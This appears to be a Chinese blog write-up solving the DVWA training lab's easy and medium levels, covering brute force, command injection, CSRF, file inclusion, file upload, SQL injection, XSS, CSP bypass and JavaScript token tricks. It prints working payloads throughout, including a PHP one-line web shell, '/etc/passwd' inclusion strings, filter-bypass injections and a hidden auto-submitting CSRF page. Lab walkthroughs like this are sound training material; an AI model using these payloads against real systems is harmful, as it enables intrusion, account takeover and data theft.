---
title: DVWA黑客攻防平台
date: 2019-07-24 11:46:51
tags:
- web
- ctf
categories:
- web
---

# 搭建环境
最好使用docker来搭建，方便迁移 https://hub.docker.com/r/vulnerables/web-dvwa/
# 暴力破解
## easy模式
> 密码破解是从存储在计算机系统中或由计算机系统传输的数据中恢复密码的过程。一种常见的方法是反复尝试密码的猜测。
用户经常选择弱密码。不安全选择的例子包括在词典中找到的单个单词，姓氏，任何太短的密码（通常被认为少于6或7个字符），或可预测的模式（例如交替的元音和辅音，这被称为leetspeak，所以“密码“变成”p @ 55w0rd“）。
创建针对目标生成的目标单词列表通常会提供最高的成功率。有一些公共工具可以根据公司网站，个人社交网络和其他常见信息（如生日或毕业年份）的组合创建字典。
最后一种方法是尝试所有可能的密码，称为暴力攻击。从理论上讲，如果尝试次数没有限制，那么暴力攻击将永远是成功的，因为可接受密码的规则必须是公开的;但随着密码长度的增加，可能的密码数量也越来越长。

使用burpsuite可破之，Burp suite运行后，Proxy 开起默认的8080 端口作为本地代理接口。
使用Burp suite通过置一个web 浏览器使用其代理服务器
```php

<?php

if( isset( $_GET[ 'Login' ] ) ) {
    // Get username
    $user = $_GET[ 'username' ];

    // Get password
    $pass = $_GET[ 'password' ];
    $pass = md5( $pass );

    // Check the database
    $query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    if( $result && mysqli_num_rows( $result ) == 1 ) {
        // Get users details
        $row    = mysqli_fetch_assoc( $result );
        $avatar = $row["avatar"];

        // Login successful
        echo "<p>Welcome to the password protected area {$user}</p>";
        echo "<img src=\"{$avatar}\" />";
    }
    else {
        // Login failed
        echo "<pre><br />Username and/or password incorrect.</pre>";
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?>
```
**PHP $_GET 变量**
在 PHP 中，预定义的 $_GET 变量用于收集来自 method="get" 的表单中的值。

**$_GET 变量**
预定义的 $_GET 变量用于收集来自 method="get" 的表单中的值。
从带有 GET 方法的表单发送的信息，**对任何人都是可见的**（会显示在浏览器的地址栏），并且对发送信息的量也有限制。

**何时使用 method="get"？**
在 HTML 表单中使用 method="get" 时，所有的变量名和值都会显示在 URL 中。
所以在发送密码或其他敏感信息时，不应该使用这个方法！
然而，正因为变量显示在 URL 中，因此可以在收藏夹中收藏该页面。在某些情况下，这是很有用的。
HTTP GET 方法不适合大型的变量值。它的值是不能超过 2000 个字符的。

```html
GET /vulnerabilities/brute/?username=admin123&password=123&Login=Login HTTP/1.1
Host: 192.168.31.84:81
Proxy-Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Referer: http://192.168.31.84:81/vulnerabilities/brute/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: PHPSESSID=rbb91verhfhas5a6k7tq77bmo4; security=low
```
我们可以看到username和password是以明文出现，可以修改。

将请求进行提交到intruder模块，在那里可以把password设置为我们破解的payload.
点击Start attack~然后就根据对面返回包的大小，知道密码，'password'返回的长度更长

## medium模式
代码与前面相比只是多了要用mysqli_real_escape_string函数进行验证，以及登录失败会 sleep(2)。将用户名和密码转义，比如说 \n 被转义成 \\n，’ 转义成 \’，这可以抵御一些 SQL 注入攻击，但是不能抵御爆破。

# 命令执行
## easy模式
> 命令注入攻击的目的是在易受攻击的应用程序中注入和执行攻击者指定的命令。在这种情况下，执行不需要的系统命令的应用程序就像一个伪系统shell，攻击者可以将它用作任何授权的系统用户。但是，命令的执行具有与Web服务相同的权限和环境。
>
> 在大多数情况下，命令注入攻击是可能的，因为缺少正确的输入数据验证，攻击者可以操纵它（表单，cookie，HTTP头等）。
>
> 操作系统（OS）（例如Linux和Windows）的语法和命令可能不同，具体取决于所需的操作。
>
> 此攻击也可称为“远程命令执行（RCE）”。

```php
<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
    // Get input
    $target = $_REQUEST[ 'ip' ];

    // Determine OS and execute the ping command.
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
        // Windows
        $cmd = shell_exec( 'ping  ' . $target );
    }
    else {
        // *nix
        $cmd = shell_exec( 'ping  -c 4 ' . $target );
    }

    // Feedback for the end user
    echo "<pre>{$cmd}</pre>";
}

?>
```

可见，服务器无条件执行了ping $target的命令，如果注入$target = 0 | dir，服务器就会执行dir
> 管道符号，是unix一个很强大的功能,符号为一条竖线:"|"。
> 用法: command 1 | command 2 他的功能是把第一个命令command 1执行的结果作为command 2的输入传给command 2
>

**任意命令执行漏洞修补办法**
在写程序时尽量地使变量不能被用户所控制！且注意变量初始化的问题。

使用str_replace对“%”，”|”,“>”进行替换

进入函数前判断变量是否合法。

## medium模式
无非就是增加了一个黑名单 &&和；，但还是可以用管道|和&
```
// Set blacklist
$substitutions = array(
    '&&' => '',
    ';'  => '',
);

```
这里需要注意的是”&&”与”&”的区别：
Command 1&&Command 2
先执行Command 1，执行成功后执行Command 2，否则不执行Command 2
Command 1&Command 2
先执行Command 1，不管是否成功，都会执行Command 2

更聪明的做法是利用&;&，黑名单会将其转化为&&

# CSRF
## easy模式
> CSRF跨站请求伪造是一种攻击，它强制终端用户在当前对其进行身份验证的Web应用程序上执行不需要的操作。在社交工程的帮助下（例如通过电子邮件/聊天发送链接），攻击者可能会强制Web应用程序的用户执行攻击者选择的操作。
> 成功的CSRF利用可能会损害最终用户数据和普通用户的操作。如果目标最终用户是管理员帐户，则可能会危及整个Web应用程序。
> 此攻击也可称为“XSRF”，类似于“跨站点脚本（XSS）”，它们通常一起使用。
> 您的任务是让当前用户使用CSRF攻击更改自己的密码，而无需他们了解自己的操作。
>

```php
<?php

if( isset( $_GET[ 'Change' ] ) ) {
    // Get input
    $pass_new  = $_GET[ 'password_new' ];
    $pass_conf = $_GET[ 'password_conf' ];

    // Do the passwords match?
    if( $pass_new == $pass_conf ) {
        // They do!
        $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
        $pass_new = md5( $pass_new );

        // Update the database
        $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
        $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

        // Feedback for the user
        echo "<pre>Password Changed.</pre>";
    }
    else {
        // Issue with passwords matching
        echo "<pre>Passwords did not match.</pre>";
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?>
```
服务器通过GET方式接收修改密码的请求，会检查参数password_new与password_conf是否相同，如果相同，就会修改密码，没有任何的防CSRF机制（当然服务器对请求的发送者是做了身份验证的，是检查的cookie，只是这里的代码没有体现）。

```htmlmixed
GET /vulnerabilities/csrf/?password_new=123&password_conf=123456&Change=Change HTTP/1.1
Host: 192.168.31.84:81
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Referer: http://192.168.31.84:81/vulnerabilities/csrf/?password_new=password&password_conf=123&Change=Change
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: PHPSESSID=rbb91verhfhas5a6k7tq77bmo4; security=low
Connection: close
```
根据拦截的http请求，可以伪造如下链接让受害者点击，从而修改密码
`http://ip:port/vulnerabilities/csrf/?password_new=test&password_conf=test&Change=Change`

更具隐藏性的方式：
1.使用短链接来隐藏 URL：
为了更加隐蔽，可以生成短网址链接，点击短链接，会自动跳转到真实网站：
http://tinyurl.com/yd2gogtv
PS:提供一个短网址生成网站
2.构造攻击页面：
* 方式 1 通过img标签中的src属性来加载CSRF攻击利用的URL，并进行布局隐藏，实现了受害者点击链接则会将密码修改。
* 方式 2 查看页面html源代码，将关于密码操作的表单部分，通过javascript的onload事件加载和css代码来隐藏布局，按GET传递参数的方式，进一步构造html form表单，实现了受害者点击链接则会将密码修改。
```html
<body onload="javascript:csrf()">
<script>
function csrf(){
document.getElementById("button").click();
}
</script>
<style>
form{
display:none;
}
</style>
    <form action="http://www.dvwa.com/vulnerabilities/csrf/?" method="GET">
        New password:<br />
        <input type="password" AUTOCOMPLETE="off" name="password_new" value="test"><br />
        Confirm new password:<br />
        <input type="password" AUTOCOMPLETE="off" name="password_conf" value="test"><br />
        <br />
        <input type="submit" id="button" name="Change" value="Change" />
    </form>
</body>
```

构造攻击页面

现实攻击场景下，这种方法需要事先在公网上传一个攻击页面，诱骗受害者去访问，真正能够在受害者不知情的情况下完成CSRF攻击。这里为了方便演示，就在本地写一个test.html，下面是具体代码。

```
<img src="http://192.168.31.84:81/vulnerabilities/csrf/?password_new=111&password_conf=111&Change=Change# border="0" style="display:none;"/>
<h1>404</h1>
<h2>file not found.</h2>
```
当受害者访问test.html时，会误认为是自己点击的是一个失效的url，但实际上已经遭受了CSRF攻击，密码已经被修改为了hack。

## medium模式
检查 HTTP_REFERER（http包头的Referer参数的值，表示来源地址）中是否包含SERVER_NAME（http包头的Host参数，及要访问的主机名，）
```
// Checks to see where the request came from
    if( stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]) !== false ) {
```
想要通过验证，就必须保证在http请求中Referer字段中必须包含Host
我们这需要把上面的攻击页面名字改成包含host就可以了。(把攻击页面放在服务器上)


# 文件包含
## easy模式
某些Web应用程序允许用户指定直接用于文件流的输入，或允许用户将文件上载到服务器。稍后，Web应用程序访问Web应用程序上下文中的用户提供的输入。通过这样做，Web应用程序允许潜在的恶意文件执行。
如果选择要包含的文件在目标计算机上是本地的，则称为“本地文件包含（LFI）。但是文件也可以包含在其他计算机上，然后攻击是”远程文件包含（RFI）。
当RFI不是一种选择时。使用LFI的另一个漏洞（例如文件上传和目录遍历）通常可以达到同样的效果。
注意，术语“文件包含”与“任意文件访问”或“文件公开”不同。
只使用文件包含来阅读'../hackable/flags/fi.php'中的所有五个着名引号。
```
<?php

// The page we wish to display
$file = $_GET[ 'page' ];

?>
```

文件包含漏洞的一般特征如下：

?page=a.php

?home=a.html

?file=content

几种经典的测试方法：

?file=../../../../../etc/passwdd
?page=file:///etc/passwd
?home=main.cgi
?page=http://www.a.com/1.php
=http://1.1.1.1/../../../../dir/file.txt
（通过多个../可以让目录回到根目录中然后再进入目标目录）

## medium模式
增加对绝对路径http和相对路径的检查
```
// Input validation
$file = str_replace( array( "http://", "https://" ), "", $file );
$file = str_replace( array( "../", "..\"" ), "", $file );
```
但依然可以使用?page=file:///etc/passwd
以及重复字符过滤方法,构造url
1. 构造url为httphttp://  --> http
2. 构造url为httphttp://://  -->http://
3. 构造url为..././   -->  ../

# 文件上传
## easy模式
> 上传的文件对Web应用程序构成重大风险。许多攻击的第一步是将一些代码提供给系统进行攻击。然后攻击者只需要找到一种方法来执行代码。使用文件上传有助于攻击者完成第一步。
> 不受限制的文件上载的后果可能会有所不同，包括完整的系统接管，过载的文件系统，向后端系统转发攻击以及简单的污损。这取决于应用程序对上传文件的作用，包括存储位置。
> 由于此文件上载漏洞，请在目标系统上执行您选择的任何PHP函数（例如phpinfo（）或system（））。
>
一句话木马1.php文件：
```
<?php
echo shell_exec($_GET['cmd']);
?>
```

```php
<?php

if( isset( $_POST[ 'Upload' ] ) ) {
    // Where are we going to be writing to?
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );

    // Can we move the file to the upload folder?
    if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {
        // No
        echo '<pre>Your image was not uploaded.</pre>';
    }
    else {
        // Yes!
        echo "<pre>{$target_path} succesfully uploaded!</pre>";
    }
}

?>
```

## medium模式
增加了对文件类型和大小的过滤，只允许图片上传
```
// File information
$uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];
$uploaded_type = $_FILES[ 'uploaded' ][ 'type' ];
$uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];

// Is it an image?
if( ( $uploaded_type == "image/jpeg" || $uploaded_type == "image/png" ) &&
    ( $uploaded_size < 100000 ) ) {
```
用burpsuite拦截修改Content-Type: application/octet-stream为Content-Type: image/jpeg。成功上传：
http://192.168.31.84:81/hackable/uploads/1.php?cmd=ls

# SQL注入
## easy模式
> SQL注入攻击包括通过从客户端到应用程序的输入数据插入或“注入”SQL查询。成功的SQL注入攻击可以从数据库中读取敏感数据，修改数据库数据（插入/更新/删除），对数据库执行管理操作（如关闭DBMS），恢复DBMS文件中存在的给定文件的内容system（load_file），在某些情况下向操作系统发出命令。
> SQL注入攻击是一种注入攻击，其中SQL命令被注入到数据平面输入中，以便实现预定义的SQL命令。
> 这种攻击也可称为“SQLi”。

```
<?php

if( isset( $_REQUEST[ 'Submit' ] ) ) {
    // Get input
    $id = $_REQUEST[ 'id' ];

    // Check database
    $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    // Get results
    while( $row = mysqli_fetch_assoc( $result ) ) {
        // Get values
        $first = $row["first_name"];
        $last  = $row["last_name"];

        // Feedback for end user
        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
    }

    mysqli_close($GLOBALS["___mysqli_ston"]);
}

?>
```

在做查询操作时，未对$id做任何限制，直接传入了sql语句，造成字符型注入

原SELECT语句
`SELECT first_name, last_name FROM users WHERE user_id = '$id'; `
中的$id可以任意输入。
当输入$id=123' OR 1=1#时，SELECT语句变成了
`SELECT first_name, last_name FROM users WHERE user_id = '123' OR 1=1#'; `
此时最后一个引号被#注释，同时1=1永远返回TRUE，这就导致所有用户的姓名泄露。
```
ID: 123' OR 1=1#
First name: admin
Surname: admin
ID: 123' OR 1=1#
First name: Gordon
Surname: Brown
ID: 123' OR 1=1#
First name: Hack
Surname: Me
ID: 123' OR 1=1#
First name: Pablo
Surname: Picasso
ID: 123' OR 1=1#
First name: Bob
Surname: Smith
```
那如果想要得到密码该怎么做，UNION 操作符用于合并两个或多个 SELECT 语句的结果集，我们可以这样构造id
`$id=123' or 1=1# union SELECT first_name,password FROM`
但貌似表里没有password
```
users
ID: 123' or 1=1# union SELECT first_name,password FROM users
First name: admin
Surname: admin
ID: 123' or 1=1# union SELECT first_name,password FROM users
First name: Gordon
Surname: Brown
ID: 123' or 1=1# union SELECT first_name,password FROM users
First name: Hack
Surname: Me
ID: 123' or 1=1# union SELECT first_name,password FROM users
First name: Pablo
Surname: Picasso
ID: 123' or 1=1# union SELECT first_name,password FROM users
First name: Bob
Surname: Smith
```

## medium模式
前端只能选择，前源码过滤了字符
`$id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $id); `
其中受影响的字符如下：
```
\x00
\n
\r
\
'
"
\x1a
```
但由于其为字符型注入，因此防御手段形同虚设
构造id=1 or 1=1#即得到所有用户信息

# SQL盲注
> 盲注，与一般注入的区别在于，一般的注入攻击者可以直接从页面上看到注入语句的执行结果，而盲注时攻击者通常是无法从显示页面上获取执行结果，甚至连注入语句是否执行都无从得知，因此盲注的难度要比一般注入高。目前网络上现存的SQL注入漏洞大多是SQL盲注。
> 1.判断是否存在注入，注入是字符型还是数字型
2.猜解当前数据库名
3.猜解数据库中的表名
4.猜解表中的字段名
5.猜解数据

```
<?php

if( isset( $_GET[ 'Submit' ] ) ) {
    // Get input
    $id = $_GET[ 'id' ];

    // Check database
    $getid  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $getid ); // Removed 'or die' to suppress mysql errors

    // Get results
    $num = @mysqli_num_rows( $result ); // The '@' character suppresses errors
    if( $num > 0 ) {
        // Feedback for end user
        echo '<pre>User ID exists in the database.</pre>';
    }
    else {
        // User wasn't found, so the page wasn't!
        header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' );

        // Feedback for end user
        echo '<pre>User ID is MISSING from the database.</pre>';
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?>
```
查看源码发现还是没有对id做过滤，但是它不会返回错误信息，只会告诉你User ID exists in the database.以及User ID is MISSING from the database.

盲注分为基于布尔的盲注、基于时间的盲注以及基于报错的盲注。
如果手工盲注的话，需要对sql语法相当熟悉。类似：
https://www.freebuf.com/articles/web/120985.html
如果自动盲注的话，可以使用sqlmap来完成，类似：
https://www.jianshu.com/p/ec2ca79e74b2

# 弱session-id
## easy模式
session-ID通常是在登录后作为特定用户访问站点所需的唯一内容，如果能够计算或轻易猜到该会话ID，则攻击者将有一种简单的方法来获取访问权限。无需知道账户密码或查找其他漏洞，如跨站点脚本。

根据源码可以看出来session每次加1
```
<?php

$html = "";

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    if (!isset ($_SESSION['last_session_id'])) {
        $_SESSION['last_session_id'] = 0;
    }
    $_SESSION['last_session_id']++;
    $cookie_value = $_SESSION['last_session_id'];
    setcookie("dvwaSession", $cookie_value);
}
?>
```
按f12看application-cookies也能发现这个规律。
然后使用hackbar这个扩展程序攻击。

## medium模式
从源码中可以看到dvwaSession就是时间戳
```
<?php

$html = "";

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    $cookie_value = time();
    setcookie("dvwaSession", $cookie_value);
}
?>
```
# 基于DOM的XSS
## easy模式
> “跨站点脚本（XSS）”攻击是一种注入问题，其中恶意脚本被注入到其他良性和可信赖的网站中。当攻击者使用Web应用程序将恶意代码（通常以浏览器端脚本的形式）发送给不同的最终用户时，就会发生XSS攻击。允许这些攻击成功的缺陷非常普遍，并且发生在使用输出中的用户输入的Web应用程序的任何地方，而不验证或编码它。
>
> 攻击者可以使用XSS将恶意脚本发送给毫无戒心的用户。最终用户的浏览器无法知道该脚本不应该被信任，并将执行JavaScript。因为它认为脚本来自可靠来源，所以恶意脚本可以访问您的浏览器保留并与该站点一起使用的任何cookie，会话令牌或其他敏感信息。这些脚本甚至可以重写HTML页面的内容。
>
> 基于DOM的XSS是一个特殊情况，反映了JavaScript隐藏在URL中并在呈现时由页面中的JavaScript拉出而不是在服务时嵌入页面中。这可能使其比其他攻击更隐蔽，并且正在阅读页面主体的WAF或其他保护措施看不到任何恶意内容。

查看页面源代码
```

				<script>
					if (document.location.href.indexOf("default=") >= 0) {
						var lang = document.location.href.substring(document.location.href.indexOf("default=")+8);
						document.write("<option value='" + lang + "'>" + decodeURI(lang) + "</option>");
						document.write("<option value='' disabled='disabled'>----</option>");
					}

					document.write("<option value='English'>English</option>");
					document.write("<option value='French'>French</option>");
					document.write("<option value='Spanish'>Spanish</option>");
					document.write("<option value='German'>German</option>");
				</script>
```
* indexOf() 方法可返回某个指定的字符串值在字符串中首次出现的位置。
* substring() 方法用于提取字符串中介于两个指定下标之间的字符。
* decodeURI() 函数可对 encodeURI() 函数编码过的 URI 进行解码
* 所以lang被赋值为"default="之后的字串，如果插入js代码，插入的 javascript 代码可以在 decodeURL(lang) 被执行

`http://192.168.31.84:81/vulnerabilities/xss_d/?default=English<script>alert(document.cookie)</script>`
这个uri被用户点击之后会被弹窗，但是在chrome测试了很多次都不行，firefox就可以

## medium模式
相对于easy模式增加了对script的过滤
```
    # Do not allow script tags
    if (stripos ($default, "<script") !== false) {
        header ("location: ?default=English");
        exit;
    }
```
绕过有两种方式
1. 方式1
url中有一个字符为#，该字符后的数据不会发送到服务器端，从而绕过服务端过滤
`http://192.168.31.84:81/vulnerabilities/xss_d/?default=English#<script>alert(document.cookie)</script>`
2. 方法2
或者就是用img标签或其他标签的特性去执行js代码，比如img标签的onerror事件，构造连接(通过加载一个不存在的图片出错出发javascript onerror事件,继续弹框，证明出来有xss)
`http://192.168.31.84:81/vulnerabilities/xss_d/?default=English%3E/option%3E%3C/select%3E%3Cimg%20src=#%20onerror=alert(/xss/)%3E'

# 反射型xss
## easy模式
> 反射型（非持久）：主要用于将恶意代码附加到URL地址的参数中，常用于窃取客户端cookie信息和钓鱼欺骗。

查看源码，服务器直接把客户端的输入返回回来显示
```php
<?php

header ("X-XSS-Protection: 0");

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Feedback for end user
    echo '<pre>Hello ' . $_GET[ 'name' ] . '</pre>';
}

?>
```

http://192.168.31.84:81/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(%27xss%27)%3C/script%3E

## medium模式
源码里检查了script标签
```
 // Get input
    $name = str_replace( '<script>', '', $_GET[ 'name' ] );
```
str_replace这个函数是不区分大小写的，而且只替换一次
改成大写就可以了<SCRIPT>alert('xss')</script>
或者嵌套<scr<script>ipt>alert('xss')</script>

但对name审查没有这么严格，同样可以采用嵌套或大小写的方法：
<scr<script>ipt>alert('fuck')</script>
<SCRIPT>alert('fuck')</script>



# 存储型xss
## easy模式
> “跨站点脚本（XSS）”攻击是一种注入问题，其中恶意脚本被注入到其他良性和可信赖的网站中。当攻击者使用Web应用程序将恶意代码（通常以浏览器端脚本的形式）发送给不同的最终用户时，就会发生XSS攻击。允许这些攻击成功的缺陷非常普遍，并且发生在使用输出中的用户输入的Web应用程序的任何地方，而不验证或编码它。
>
> 攻击者可以使用XSS将恶意脚本发送给毫无戒心的用户。最终用户的浏览器无法知道该脚本不应该被信任，并将执行JavaScript。因为它认为脚本来自可靠来源，所以恶意脚本可以访问您的浏览器保留并与该站点一起使用的任何cookie，会话令牌或其他敏感信息。这些脚本甚至可以重写HTML页面的内容。
>
> XSS存储在数据库中。 XSS是永久性的，直到重置数据库或手动删除有效负载。
>

查看源码
trim是去除掉用户输入内容前后的空格。stripslashes是去除反斜杠，两个只会去除一个。mysqli_real_escap_string过滤掉内容中特殊字符，像x00,n,r,,',",x1a等，来预防数据库攻击。
```
<?php

if( isset( $_POST[ 'btnSign' ] ) ) {
    // Get input
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );

    // Sanitize message input
    $message = stripslashes( $message );
    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Sanitize name input
    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Update database
    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    //mysql_close();
}

?>
```
插入之后会成为页面的元素显示出来
`<div id="guestbook_comments">Name: 11<br />Message: 111<br /></div>`
看一下提交的方式：
`txtName=22&mtxMessage=222&btnSign=Sign+Guestbook`
直接插入script语句，`txtName=22<script>alert(1)</script>&mtxMessage=222&btnSign=Sign+Guestbook`

## medium模式
源码中增加了几个函数的使用：
*  $message = strip_tags(addslashes($message)); 剥去字符串中的 HTML、XML 以及 PHP 的标签。
* $message = htmlspecialchars( $message ); 把预定义的字符 "<" （小于）和 ">" （大于）转换为 HTML 实体：
*  $name = str_replace( '<script>', '', $name );



# 绕过安全策略
## easy模式
> 内容安全策略（CSP）用于定义可以从中加载或执行脚本和其他资源的位置。本单元将引导您根据开发人员常见错误绕过策略。
> 这些漏洞都不是CSP中的实际漏洞，它们是实施漏洞的漏洞。
>

```
<?php

$headerCSP = "Content-Security-Policy: script-src 'self' https://pastebin.com  example.com code.jquery.com https://ssl.google-analytics.com ;"; // allows js from self, pastebin.com, jquery and google analytics.

header($headerCSP);

# https://pastebin.com/raw/R570EE00

?>
<?php
if (isset ($_POST['include'])) {
$page[ 'body' ] .= "
    <script src='" . $_POST['include'] . "'></script>
";
}
$page[ 'body' ] .= '
<form name="csp" method="POST">
    <p>You can include scripts from external sources, examine the Content Security Policy and enter a URL to include here:</p>
    <input size="50" type="text" name="include" value="" id="include" />
    <input type="submit" value="Include" />
</form>
';
```
会在页面里增加一个body`<script src='" . $_POST['include'] . "'></script>`
这里在源码中规定了信任的脚本源：
`script-src 'self' https://pastebin.com  example.com code.jquery.com https://ssl.google-analytics.com ;"; // allows js from self, pastebin.com, jquery and google analytics.`
输入源码中提示的https://pastebin.com/raw/R570EE00，弹窗成功

## medium模式
如果你要使用 script 标签加载 javascript, 你需要指明其 nonce 值
``$headerCSP = "Content-Security-Policy: script-src 'self' 'unsafe-inline' 'nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=';";``
比如：
``<script nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=">alert(1)</script>``

# JavaScript Attacks
## easy模式
> 本节中的攻击旨在帮助您了解JavaScript在浏览器中的使用方式以及如何操作它。攻击可以通过分析网络流量来进行，但这不是重点，也可能要困难得多。
> 只需提交“成功”一词即可赢得关卡。显然，它并不那么容易，每个级别实现不同的保护机制，页面中包含的JavaScript必须进行分析，然后进行操作以绕过保护。
>

提示我们Submit the word "success" to win.但是输入success却返回Invalid token.说明token值不对劲，后台应该是比较输入的字符串与‘success’。
查看源码发现token值是在前台计算的，md5(rot13(phrase))
```
    function generate_token() {
        var phrase = document.getElementById("phrase").value;
        document.getElementById("token").value = md5(rot13(phrase));
    }

    generate_token();
```
然而，phrase的值等于ChangeMe
`<input type="text" name="phrase" value="ChangeMe" id="phrase">`
因此计算出来的token也是不对的，我们在chrome的控制台直接计算
```
md5(rot13("success"))
"38581812b435834ebf84ebcc2c6424d6"
```
把值给隐藏的元素`<input type="hidden" name="token" value="8b479aefbd90795395b3e7089ae0dc09" id="token">`
然后提交success

## medium模式
生成token的代码在js文件中
```javascript=
function do_something(e) {
    for (var t = "", n = e.length - 1; n >= 0; n--) t += e[n];
    return t
}
setTimeout(function () {
    do_elsesomething("XX")
}, 300);

function do_elsesomething(e) {
    document.getElementById("token").value = do_something(e + document.getElementById("phrase").value + "XX")
}
```
输入success，然后控制台运行do_elsesomething("XX")就可以拿到token
